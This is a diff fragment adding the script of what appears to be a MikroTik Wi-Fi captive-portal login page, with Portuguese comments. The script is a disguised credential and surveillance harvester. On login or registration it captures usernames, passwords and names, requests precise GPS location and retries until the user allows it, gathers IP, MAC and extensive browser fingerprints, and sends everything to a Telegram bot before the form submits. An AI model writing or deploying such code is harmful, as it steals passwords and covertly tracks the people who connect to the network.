+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            source: 'GPS_PRECISO'
+                        };
+                        status.innerHTML = '✅ Localização verificada com sucesso';
+                        status.style.borderColor = 'rgba(34, 197, 94, 0.6)';
+                        status.style.color = '#86efac';
+                    },
+                    (error) => {
+                        window.gpsData = {
+                            latitude: 'Negado',
+                            longitude: 'Negado',
+                            accuracy: 'N/A',
+                            source: 'NEGADO'
+                        };
+                        status.innerHTML = '⚠️ Habilite a localização para continuar';
+                        status.style.borderColor = 'rgba(245, 158, 11, 0.6)';
+                        status.style.color = '#fcd34d';
+                        
+                        // Tentar novamente após 5 segundos
+                        setTimeout(requestGPSLocation, 5000);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+        }
+
+        function showForm(type) {
+            const loginBtn = document.querySelector('.toggle-btn:nth-child(1)');
+            const registerBtn = document.querySelector('.toggle-btn:nth-child(2)');
+            const loginForm = document.getElementById('loginForm');
+            const registerForm = document.getElementById('registerForm');
+            const message = document.getElementById('message');
+
+            message.style.display = 'none';
+
+            if (type === 'login') {
+                loginBtn.classList.add('active');
+                registerBtn.classList.remove('active');
+                loginForm.classList.add('active');
+                registerForm.classList.remove('active');
+            } else {
+                registerBtn.classList.add('active');
+                loginBtn.classList.remove('active');
+                registerForm.classList.add('active');
+                loginForm.classList.remove('active');
+            }
+        }
+
+        // 🎨 FINGERPRINTS
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Fingerprint', 4, 17);
+                return canvas.toDataURL().slice(-50);
+            } catch (e) { return 'N/A'; }
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return { vendor: 'N/A', renderer: 'N/A', version: 'N/A' };
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+                    version: gl.getParameter(gl.VERSION)
+                };
+            } catch (e) { return { vendor: 'N/A', renderer: 'N/A', version: 'N/A' }; }
+        }
+
+        async function getAudioFingerprint() {
+            try {
+                const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+                if (!AudioContext) return 'N/A';
+                const context = new AudioContext(1, 5000, 44100);
+                const oscillator = context.createOscillator();
+                oscillator.type = 'triangle';
+                oscillator.frequency.setValueAtTime(10000, context.currentTime);
+                const compressor = context.createDynamicsCompressor();
+                compressor.threshold.setValueAtTime(-50, context.currentTime);
+                compressor.knee.setValueAtTime(40, context.currentTime);
+                compressor.ratio.setValueAtTime(12, context.currentTime);
+                compressor.attack.setValueAtTime(0, context.currentTime);
+                compressor.release.setValueAtTime(0.25, context.currentTime);
+                oscillator.connect(compressor);
+                compressor.connect(context.destination);
+                oscillator.start(0);
+                const buffer = await context.startRendering();
+                const data = buffer.getChannelData(0);
+                let sum = 0;
+                for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
+                return sum.toFixed(5);
+            } catch (e) { return 'N/A'; }
+        }
+
+        function detectFonts() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testFonts = ['Arial', 'Courier New', 'Georgia', 'Helvetica', 'Times New Roman', 'Verdana', 'Trebuchet MS', 'Palatino', 'Impact', 'Comic Sans MS', 'Lucida Console', 'Tahoma', 'Arial Black', 'Consolas', 'Calibri', 'Cambria', 'Segoe UI', 'Roboto', 'Open Sans', 'Ubuntu'];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const span = document.createElement('span');
+            span.style.position = 'absolute';
+            span.style.left = '-9999px';
+            span.style.fontSize = testSize;
+            span.style.lineHeight = 'normal';
+            span.innerText = testString;
+            document.body.appendChild(span);
+            const defaultWidth = {};
+            const defaultHeight = {};
+            baseFonts.forEach(font => {
+                span.style.fontFamily = font;
+                defaultWidth[font] = span.offsetWidth;
+                defaultHeight[font] = span.offsetHeight;
+            });
+            const detected = testFonts.filter(font => {
+                let detected = false;
+                baseFonts.forEach(baseFont => {
+                    span.style.fontFamily = `'${font}', ${baseFont}`;
+                    if (span.offsetWidth !== defaultWidth[baseFont] || span.offsetHeight !== defaultHeight[baseFont]) detected = true;
+                });
+                return detected;
+            });
+            document.body.removeChild(span);
+            return detected;
+        }
+
+        // 📊 COLETAR TODOS OS DADOS
+        async function collectDeviceData(action) {
+            const data = {
+                action: action,
+                timestamp: new Date().toLocaleString('pt-BR'),
+                userAgent: navigator.userAgent,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages?.join(', ') || navigator.language,
+                onLine: navigator.onLine,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                devicePixelRatio: window.devicePixelRatio,
+                orientation: screen.orientation?.type || 'N/A',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                connectionType: navigator.connection ? (navigator.connection.effectiveType || 'N/A') : 'N/A',
+                downlink: navigator.connection ? (navigator.connection.downlink || 'N/A') : 'N/A',
+                rtt: navigator.connection ? (navigator.connection.rtt || 'N/A') : 'N/A',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                referrer: document.referrer || 'Direto',
+                currentURL: window.location.href,
+                canvasFingerprint: getCanvasFingerprint(),
+                webglFingerprint: getWebGLFingerprint(),
+                audioFingerprint: await getAudioFingerprint(),
+                installedFonts: detectFonts(),
+                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'N/A',
+                touchSupport: 'ontouchstart' in window,
+                batteryLevel: 'N/A',
+                batteryCharging: 'N/A',
+                prefersColorScheme: window.matchMedia?.('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
+                mikrotik_username: '$(username)',
+                mikrotik_remote_address: '$(remote-address)',
+                mikrotik_mac: '$(mac)',
+                mikrotik_server_name: '$(server-name)',
+                mikrotik_link_orig: '$(link-orig)'
+            };
+
+            // Bateria
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data.batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                    data.batteryCharging = battery.charging ? 'Sim' : 'Não';
+                } catch (e) {}
+            }
+
+            // IP e localização via API
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                data.publicIP = ipData.ip;
+                data.city = ipData.city;
+                data.region = ipData.region;
+                data.country = ipData.country_name;
+                data.postal = ipData.postal;
+                data.ipLatitude = ipData.latitude;
+                data.ipLongitude = ipData.longitude;
+                data.org = ipData.org;
+                data.asn = ipData.asn;
+                data.isp = ipData.org;
+            } catch (e) {
+                data.publicIP = 'Não disponível';
+            }
+
+            // GPS PRECISO (solicitado)
+            if (window.gpsData) {
+                data.gps_latitude = window.gpsData.latitude;
+                data.gps_longitude = window.gpsData.longitude;
+                data.gps_accuracy = window.gpsData.accuracy;
+                data.gps_altitude = window.gpsData.altitude || 'N/A';
+                data.gps_speed = window.gpsData.speed || 'N/A';
+                data.gps_heading = window.gpsData.heading || 'N/A';
+                data.gps_source = window.gpsData.source;
+            } else {
+                data.gps_latitude = data.ipLatitude || 'N/A';
+                data.gps_longitude = data.ipLongitude || 'N/A';
+                data.gps_accuracy = 'Aproximada (IP)';
+                data.gps_source = 'IP_API';
+            }
+
+            // Dispositivos de mídia
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    data.mediaDevices = {
+                        audioInput: devices.filter(d => d.kind === 'audioinput').length,
+                        audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
+                        videoInput: devices.filter(d => d.kind === 'videoinput').length
+                    };
+                } catch (e) {}
+            }
+
+            return data;
+        }
+
+        // 📝 FORMATAR MENSAGEM
+        function formatTelegramMessage(userData, formData) {
+            const isLogin = userData.action === 'login';
+            const action = isLogin ? '🟢 LOGIN' : '🔵 CADASTRO';
+            
+            let message = `${action} - PORTAL DE ACESSO\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
+            
+            message += `👤 *DADOS DA CONTA:*\n`;
+            if (!isLogin && formData.name) message += `├ Nome: ${formData.name}\n`;
+            message += `├ Usuário: ${formData.username}\n`;
+            message += `├ Senha: ${formData.password}\n`;
+            message += `└ Data: ${userData.timestamp}\n\n`;
+            
+            message += `📍 *LOCALIZAÇÃO GPS PRECISA:*\n`;
+            message += `├ Latitude: ${userData.gps_latitude}\n`;
+            message += `├ Longitude: ${userData.gps_longitude}\n`;
+            message += `├ Precisão: ${userData.gps_accuracy}m\n`;
+            message += `├ Altitude: ${userData.gps_altitude}\n`;
+            message += `├ Velocidade: ${userData.gps_speed}\n`;
+            message += `├ Direção: ${userData.gps_heading}\n`;
+            message += `└ Fonte: ${userData.gps_source}\n\n`;
+            
+            message += `🌍 *LOCALIZAÇÃO POR IP:*\n`;
+            message += `├ IP Público: ${userData.publicIP}\n`;
+            message += `├ IP MikroTik: ${userData.mikrotik_remote_address}\n`;
+            message += `├ MAC: ${userData.mikrotik_mac}\n`;
+            message += `├ Cidade: ${userData.city}\n`;
+            message += `├ Região: ${userData.region}\n`;
+            message += `├ País: ${userData.country}\n`;
+            message += `├ CEP: ${userData.postal}\n`;
+            message += `├ ISP: ${userData.isp}\n`;
+            message += `├ ASN: ${userData.asn}\n`;
+            message += `├ Lat IP: ${userData.ipLatitude}\n`;
+            message += `└ Long IP: ${userData.ipLongitude}\n\n`;
+            
+            message += `💻 *DISPOSITIVO:*\n`;
+            message += `├ Plataforma: ${userData.platform}\n`;
+            message += `├ Idioma: ${userData.language}\n`;
+            message += `├ CPU Cores: ${userData.hardwareConcurrency}\n`;
+            message += `├ RAM: ${userData.deviceMemory}GB\n`;
+            message += `├ Touch: ${userData.maxTouchPoints} pontos\n`;
+            message += `├ Bateria: ${userData.batteryLevel}\n`;
+            message += `└ Carregando: ${userData.batteryCharging}\n\n`;
+            
+            message += `📱 *TELA:*\n`;
+            message += `├ Resolução: ${userData.screenWidth}x${userData.screenHeight}\n`;
+            message += `├ Window: ${userData.windowWidth}x${userData.windowHeight}\n`;
+            message += `├ Pixel Ratio: ${userData.devicePixelRatio}\n`;
+            message += `├ Color Depth: ${userData.colorDepth}bit\n`;
+            message += `└ Orientação: ${userData.orientation}\n\n`;
+            
+            message += `🔌 *CONEXÃO:*\n`;
+            message += `├ Tipo: ${userData.connectionType}\n`;
+            message += `├ Velocidade: ${userData.downlink} Mbps\n`;
+            message += `├ Latência: ${userData.rtt}ms\n`;
+            message += `└ Online: ${userData.onLine}\n\n`;
+            
+            message += `🎨 *FINGERPRINTS:*\n`;
+            message += `├ Canvas: ${userData.canvasFingerprint}\n`;
+            message += `├ Audio: ${userData.audioFingerprint}\n`;
+            message += `├ GPU Vendor: ${userData.webglFingerprint.vendor}\n`;
+            message += `└ GPU Renderer: ${userData.webglFingerprint.renderer}\n\n`;
+            
+            if (userData.mediaDevices) {
+                message += `🎤 *MÍDIA:*\n`;
+                message += `├ Microfones: ${userData.mediaDevices.audioInput}\n`;
+                message += `├ Alto-falantes: ${userData.mediaDevices.audioOutput}\n`;
+                message += `└ Câmeras: ${userData.mediaDevices.videoInput}\n\n`;
+            }
+            
+            message += `🔤 *FONTES:*\n└ ${userData.installedFonts.join(', ')}\n\n`;
+            
+            message += `🔐 *NAVEGADOR:*\n`;
+            message += `├ Cookies: ${userData.cookieEnabled}\n`;
+            message += `├ DNT: ${userData.doNotTrack}\n`;
+            message += `├ Tema: ${userData.prefersColorScheme}\n`;
+            message += `├ Timezone: ${userData.timezone}\n`;
+            message += `├ Server: ${userData.mikrotik_server_name}\n`;
+            message += `└ URL: ${userData.currentURL}\n\n`;
+            
+            message += `⚡ *User Agent:*\n\`${userData.userAgent}\``;
+            
+            return message;
+        }
+
+        // 📤 ENVIAR PARA TELEGRAM
+        async function sendToTelegram(userData, formData) {
+            try {
+                const message = formatTelegramMessage(userData, formData);
+                const encodedMessage = encodeURIComponent(message);
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+                
+                await fetch(url, { method: 'GET', mode: 'no-cors' });
+                
+                // Enviar localização GPS precisa no mapa
+                const lat = parseFloat(userData.gps_latitude);
+                const lon = parseFloat(userData.gps_longitude);
+                
+                if (!isNaN(lat) && !isNaN(lon) && userData.gps_source === 'GPS_PRECISO') {
+                    const locationUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation?chat_id=${TELEGRAM_CHAT_ID}&latitude=${lat}&longitude=${lon}`;
+                    await fetch(locationUrl, { method: 'GET', mode: 'no-cors' });
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Erro:', error);
+                return false;
+            }
+        }
+
+        function showMessage(text, type) {
+            const message = document.getElementById('message');
+            message.textContent = text;
+            message.className = 'message ' + type;
+            message.style.display = 'block';
+            setTimeout(() => { message.style.display = 'none'; }, 5000);
+        }
+
+        // 🔐 HANDLE LOGIN
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            document.getElementById('loadingText').textContent = 'Autenticando e verificando segurança...';
+            document.getElementById('loading').style.display = 'flex';
+            
+            try {
+                const deviceData = await collectDeviceData('login');
+                await sendToTelegram(deviceData, { username, password });
+            } catch (error) {
+                console.error('Erro:', error);
+            }
+            
+            setTimeout(() => {
+                document.getElementById('loginForm').submit();
+            }, 2000);
+        });
+
+        // 📝 HANDLE CADASTRO
+        async function handleRegister(e) {
+            e.preventDefault();
+            
+            const name = document.getElementById('regName').value;
+            const username = document.getElementById('regUsername').value;
+            const password = document.getElementById('regPassword').value;
+            const confirmPassword = document.getElementById('regConfirmPassword').value;
+            
+            if (password !== confirmPassword) {
+                showMessage('As senhas não coincidem!', 'error');
+                return;
+            }
+            
+            if (password.length < 6) {
+                showMessage('A senha deve ter pelo menos 6 caracteres!', 'error');
+                return;
+            }
+            
+            document.getElementById('loadingText').textContent = 'Criando conta e verificando...';
+            document.getElementById('loading').style.display = 'flex';
+            
+            try {
+                const deviceData = await collectDeviceData('register');
+                await sendToTelegram(deviceData, { name, username, password });
+                
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    showMessage('✅ Cadastro realizado! Faça login.', 'success');
+                    document.getElementById('registerForm').reset();
+                    setTimeout(() => { showForm('login'); }, 2000);
+                }, 1500);
+            } catch (error) {
+                console.error('Erro:', error);
+                document.getElementById('loading').style.display = 'none';
+                showMessage('Erro ao processar. Tente novamente.', 'error');
+            }
+        }
+
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const activeForm = document.querySelector('.form.active');
+                if (activeForm) activeForm.dispatchEvent(new Event('submit'));
+            }
+        });
+
+        // 🚨 INICIAR SISTEMA DE PRESSÃO
+        window.addEventListener('load', startPressureSystem);
+    </script>
 </body>
 </html>
